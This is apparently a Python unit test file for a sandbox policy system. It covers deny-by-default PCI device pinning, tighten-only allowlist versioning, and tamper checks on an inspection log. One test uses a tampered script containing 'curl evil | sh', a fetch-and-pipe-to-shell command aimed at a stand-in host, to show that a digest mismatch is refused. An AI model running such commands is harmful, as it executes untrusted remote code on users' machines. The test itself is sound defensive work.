"""Unit tests for gov/jail_pci.py and gov/inspection.py (wave-220 lane C).

PCI deny-by-default: compiled device allowlists refuse every attach
unless the (device_name, sha256 digest) pin is explicitly listed;
tighten-only opt-in wiring into JailPolicyRegistry.activate and
CompiledJailPolicy. Inspection-result consumption: structural
verifier-attribution on every admitted link, halt on nonzero exit
with a named code, evidence emitted before the link is admitted.

Red-first: the battery in evals/w220_jailinspect_probes.py carries
the pristine GAP evidence (12/12 GAP on 4acc49b); these tests pin the
fixed behavior.
"""

import hashlib
import unittest

from gov import ed25519 as _ed
from gov import inspection as insp
from gov import jail_pci as jpci
from gov import jail_policy as jp
from gov import policy_compile as pc

NOW = 1785000000
FULL = {"timeout", "rlimit", "netns", "pidns", "pivot_root", "seccomp",
        "privdrop"}


def _sha(b):
    return hashlib.sha256(b).hexdigest()


def _issuer():
    seed = hashlib.sha256(b"w220-jail-pci-tests").digest()
    return seed, _ed.publickey(seed)


def _activate(reg, name="tool-python", version=1, **kwargs):
    seed, _ = _issuer()
    body = jp.make_policy_body(name, version, writable_dirs=["/output"])
    sig = jp.sign_policy(seed, body)
    return reg.activate({"body": body, "signature": sig}, now=NOW,
                        features=FULL, **kwargs)


class TestDevicePinCompile(unittest.TestCase):
    def test_valid_pin_normalizes(self):
        pin = jpci.validate_device_pin(
            {"device_name": "net0", "device_digest": _sha(b"fw")})
        self.assertEqual(pin["device_name"], "net0")
        self.assertEqual(pin["device_digest"], _sha(b"fw"))

    def test_malformed_pins_refused_at_compile(self):
        bad = [
            {"device_name": "net0", "device_digest": "zz"},
            {"device_name": "net0", "device_digest": "ab" * 10},
            {"device_name": "BAD NAME", "device_digest": _sha(b"x")},
            {"device_name": "net0"},
            {"device_digest": _sha(b"x")},
            {"device_name": "net0", "device_digest": _sha(b"x"),
             "extra": 1},
            "not-a-dict",
        ]
        for entry in bad:
            arg = [entry] if isinstance(entry, dict) else entry
            with self.assertRaises(jpci.JailPCIError) as ctx:
                jpci.compile_pci_allowlist(arg)
            self.assertEqual(ctx.exception.code, "device-pin-malformed")

    def test_empty_allowlist_compiles_to_deny_all(self):
        allow = jpci.compile_pci_allowlist([])
        self.assertEqual(allow.pins(), [])
        with self.assertRaises(jpci.JailPCIError) as ctx:
            allow.authorize("net0", _sha(b"fw"))
        self.assertEqual(ctx.exception.code, "pci-attach-refused")

    def test_fingerprint_stable_and_keyed(self):
        entries = [{"device_name": "net0", "device_digest": _sha(b"fw")}]
        a = jpci.compile_pci_allowlist(entries)
        b = jpci.compile_pci_allowlist(entries)
        self.assertEqual(a.fingerprint(), b.fingerprint())
        self.assertEqual(len(a.fingerprint()), 64)

    def test_duplicate_pins_collapse(self):
        entries = [{"device_name": "net0", "device_digest": _sha(b"fw")},
                   {"device_name": "net0", "device_digest": _sha(b"fw")}]
        allow = jpci.compile_pci_allowlist(entries)
        self.assertEqual(len(allow.pins()), 1)


class TestAuthorize(unittest.TestCase):
    def setUp(self):
        self.digest = _sha(b"firmware-v1")
        self.allow = jpci.compile_pci_allowlist(
            [{"device_name": "net0", "device_digest": self.digest}])

    def test_pinned_device_grants_audit_visible(self):
        grant = self.allow.authorize("net0", self.digest)
        self.assertTrue(grant["allowed"])
        self.assertEqual(grant["device_name"], "net0")
        self.assertEqual(grant["device_digest"], self.digest)
        self.assertEqual(grant["allowlist_fingerprint"],
                         self.allow.fingerprint())
        self.assertEqual(grant["code"], "pci-attach-allowed")

    def test_digest_swap_refused(self):
        with self.assertRaises(jpci.JailPCIError) as ctx:
            self.allow.authorize("net0", _sha(b"firmware-EVIL"))
        self.assertEqual(ctx.exception.code, "pci-attach-refused")

    def test_unpinned_name_refused(self):
        with self.assertRaises(jpci.JailPCIError) as ctx:
            self.allow.authorize("gpu0", _sha(b"something"))
        self.assertEqual(ctx.exception.code, "pci-attach-refused")

    def test_nonstring_request_malformed(self):
        with self.assertRaises(jpci.JailPCIError) as ctx:
            self.allow.authorize("net0", None)
        self.assertEqual(ctx.exception.code,
                         "pci-attach-request-malformed")


class TestRegistryWiring(unittest.TestCase):
    def test_legacy_activate_byte_identical(self):
        _, pub = _issuer()
        reg = jp.JailPolicyRegistry(pub)
        body = _activate(reg)
        report = reg.check("tool-python", 1,
                           {"writable_dirs": ["/output"],
                            "wants_network": False, "timeout_s": 5},
                           now=NOW)
        self.assertEqual(report["policy_digest"], jp.policy_digest(body))
        kwargs = jp.to_sandbox_kwargs(
            reg.get("tool-python", 1, now=NOW),
            {"/output": "/var/tmp/g220c-out"})
        self.assertEqual(kwargs["cage_mode"], "strict")
        self.assertEqual(kwargs["timeout"], 5)

    def test_no_allowlist_attach_refused(self):
        _, pub = _issuer()
        reg = jp.JailPolicyRegistry(pub)
        _activate(reg)
        with self.assertRaises(jp.JailPolicyError) as ctx:
            reg.authorize_pci_attach("tool-python", 1, "net0",
                                     _sha(b"x"), now=NOW)
        self.assertEqual(ctx.exception.code, "pci-attach-refused")

    def test_stored_allowlist_enforced(self):
        _, pub = _issuer()
        reg = jp.JailPolicyRegistry(pub)
        digest = _sha(b"firmware-v1")
        allow = jpci.compile_pci_allowlist(
            [{"device_name": "net0", "device_digest": digest}])
        _activate(reg, pci_allowlist=allow)
        grant = reg.authorize_pci_attach("tool-python", 1, "net0",
                                         digest, now=NOW)
        self.assertTrue(grant["allowed"])
        with self.assertRaises(jp.JailPolicyError) as ctx:
            reg.authorize_pci_attach("tool-python", 1, "gpu0",
                                     digest, now=NOW)
        self.assertEqual(ctx.exception.code, "pci-attach-refused")

    def test_wrong_type_allowlist_refused(self):
        _, pub = _issuer()
        reg = jp.JailPolicyRegistry(pub)
        with self.assertRaises(jp.JailPolicyError) as ctx:
            _activate(reg, pci_allowlist=["not", "an", "allowlist"])
        self.assertEqual(ctx.exception.code, "registry-malformed")

    def test_attach_on_expired_policy_refused(self):
        _, pub = _issuer()
        reg = jp.JailPolicyRegistry(pub)
        seed, _ = _issuer()
        body = jp.make_policy_body("old", 1, writable_dirs=["/output"],
                                   not_before=1, not_after=2)
        sig = jp.sign_policy(seed, body)
        allow = jpci.compile_pci_allowlist([])
        reg.activate({"body": body, "signature": sig}, now=1,
                     features=FULL, pci_allowlist=allow)
        with self.assertRaises(jp.JailPolicyError) as ctx:
            reg.authorize_pci_attach("old", 1, "net0", _sha(b"x"), now=99)
        self.assertEqual(ctx.exception.code, "policy-stale")

    def _activate_version(self, reg, name, version, pins):
        seed, _ = _issuer()
        body = jp.make_policy_body(name, version,
                                   writable_dirs=["/output"])
        sig = jp.sign_policy(seed, body)
        allow = jpci.compile_pci_allowlist(
            [{"device_name": n, "device_digest": d} for n, d in pins])
        reg.activate({"body": body, "signature": sig}, now=NOW,
                     features=FULL, pci_allowlist=allow)

    def test_allowlist_widening_refused(self):
        _, pub = _issuer()
        reg = jp.JailPolicyRegistry(pub)
        d1, d2 = _sha(b"fw1"), _sha(b"fw2")
        self._activate_version(reg, "tool-python", 1,
                               [("net0", d1)])
        with self.assertRaises(jp.JailPolicyError) as ctx:
            self._activate_version(reg, "tool-python", 2,
                                   [("net0", d1), ("gpu0", d2)])
        self.assertEqual(ctx.exception.code,
                         "pci-allowlist-widening-refused")

    def test_allowlist_shrinking_allowed(self):
        _, pub = _issuer()
        reg = jp.JailPolicyRegistry(pub)
        d1, d2 = _sha(b"fw1"), _sha(b"fw2")
        self._activate_version(reg, "tool-python", 1,
                               [("net0", d1), ("gpu0", d2)])
        self._activate_version(reg, "tool-python", 2,
                               [("net0", d1)])
        grant = reg.authorize_pci_attach("tool-python", 2, "net0",
                                         d1, now=NOW)
        self.assertTrue(grant["allowed"])
        with self.assertRaises(jp.JailPolicyError) as ctx:
            reg.authorize_pci_attach("tool-python", 2, "gpu0",
                                     d2, now=NOW)
        self.assertEqual(ctx.exception.code, "pci-attach-refused")


class TestCompilePathWiring(unittest.TestCase):
    def test_compiled_default_refuses(self):
        body = jp.make_policy_body("tool-python", 1,
                                   writable_dirs=["/output"])
        compiled = pc.compile_jail_policy(body)
        with self.assertRaises(jp.JailPolicyError) as ctx:
            compiled.authorize_pci("net0", _sha(b"x"))
        self.assertEqual(ctx.exception.code, "pci-attach-refused")

    def test_compiled_with_allowlist_authorizes(self):
        body = jp.make_policy_body("tool-python", 1,
                                   writable_dirs=["/output"])
        digest = _sha(b"firmware-v1")
        allow = jpci.compile_pci_allowlist(
            [{"device_name": "net0", "device_digest": digest}])
        compiled = pc.compile_jail_policy(body, pci_allowlist=allow)
        grant = compiled.authorize_pci("net0", digest)
        self.assertTrue(grant["allowed"])
        # The compiled check path is unchanged by the wiring.
        report = compiled.check({"writable_dirs": ["/output"],
                                 "wants_network": False, "timeout_s": 5})
        self.assertTrue(report["conforms"])

    def test_compiled_wrong_type_refused_at_compile(self):
        body = jp.make_policy_body("tool-python", 1,
                                   writable_dirs=["/output"])
        with self.assertRaises(pc.PolicyCompilationError):
            pc.compile_jail_policy(body, pci_allowlist="nope")


class TestInspectionLog(unittest.TestCase):
    def setUp(self):
        self.log = insp.InspectionLog(verifier_id="verifier-1")
        self.script = b"#!/bin/sh\necho ok\n"

    def test_happy_path_link_attributed(self):
        link = self.log.admit("build", self.script, _sha(self.script),
                              0, b"ok")
        self.assertTrue(link["verifier_attributed"])
        self.assertEqual(link["script_digest"], _sha(self.script))
        self.assertEqual(link["verifier_id"], "verifier-1")
        self.assertEqual(link["evidence_seq"], 1)
        self.assertTrue(self.log.verify())
        self.assertTrue(self.log.verify_link(link))

    def test_nonzero_exit_halts_but_records(self):
        with self.assertRaises(insp.InspectionError) as ctx:
            self.log.admit("build", self.script, _sha(self.script),
                           3, b"partial")
        self.assertEqual(ctx.exception.code, "inspection-failed")
        # The failed attempt is evidence; the log still verifies.
        self.assertTrue(self.log.verify())
        self.assertEqual(len(self.log.records()), 1)

    def test_tampered_script_records_nothing(self):
        with self.assertRaises(insp.InspectionError) as ctx:
            self.log.admit("build", b"#!/bin/sh\ncurl evil | sh\n",
                           _sha(self.script), 0, b"ok")
        self.assertEqual(ctx.exception.code,
                         "inspection-script-digest-mismatch")
        self.assertEqual(self.log.records(), [])

    def test_forged_seq_refused(self):
        link = self.log.admit("build", self.script, _sha(self.script),
                              0, b"ok")
        forged = dict(link)
        forged["evidence_seq"] = 999
        with self.assertRaises(insp.InspectionError) as ctx:
            self.log.verify_link(forged)
        self.assertEqual(ctx.exception.code,
                         "inspection-link-unverifiable")

    def test_outputs_tamper_refused(self):
        link = self.log.admit("build", self.script, _sha(self.script),
                              0, b"ok")
        forged = dict(link)
        forged["outputs_digest"] = _sha(b"forged")
        with self.assertRaises(insp.InspectionError) as ctx:
            self.log.verify_link(forged)
        self.assertEqual(ctx.exception.code,
                         "inspection-link-unverifiable")

    def test_handmade_link_refused(self):
        handmade = {"name": "build",
                    "script_digest": _sha(self.script),
                    "verifier_id": "verifier-1",
                    "verifier_attributed": True,
                    "evidence_seq": 1,
                    "outputs_digest": _sha(b"ok")}
        with self.assertRaises(insp.InspectionError) as ctx:
            self.log.verify_link(handmade)
        self.assertEqual(ctx.exception.code,
                         "inspection-link-unverifiable")

    def test_unattributed_link_refused(self):
        link = self.log.admit("build", self.script, _sha(self.script),
                              0, b"ok")
        stripped = dict(link)
        stripped["verifier_attributed"] = False
        with self.assertRaises(insp.InspectionError) as ctx:
            self.log.verify_link(stripped)
        self.assertEqual(ctx.exception.code,
                         "inspection-link-unverifiable")

    def test_foreign_verifier_id_refused(self):
        link = self.log.admit("build", self.script, _sha(self.script),
                              0, b"ok")
        forged = dict(link)
        forged["verifier_id"] = "verifier-2"
        with self.assertRaises(insp.InspectionError) as ctx:
            self.log.verify_link(forged)
        self.assertEqual(ctx.exception.code,
                         "inspection-link-unverifiable")

    def test_bad_verifier_id_rejected(self):
        with self.assertRaises(insp.InspectionError) as ctx:
            insp.InspectionLog(verifier_id="")
        self.assertEqual(ctx.exception.code, "inspection-malformed")

    def test_malformed_admit_args_refused(self):
        with self.assertRaises(insp.InspectionError):
            self.log.admit("", self.script, _sha(self.script), 0, b"ok")
        with self.assertRaises(insp.InspectionError):
            self.log.admit("build", self.script, _sha(self.script),
                           "zero", b"ok")
        with self.assertRaises(insp.InspectionError):
            self.log.admit("build", "not-bytes", _sha(self.script),
                           0, b"ok")


if __name__ == "__main__":
    unittest.main()
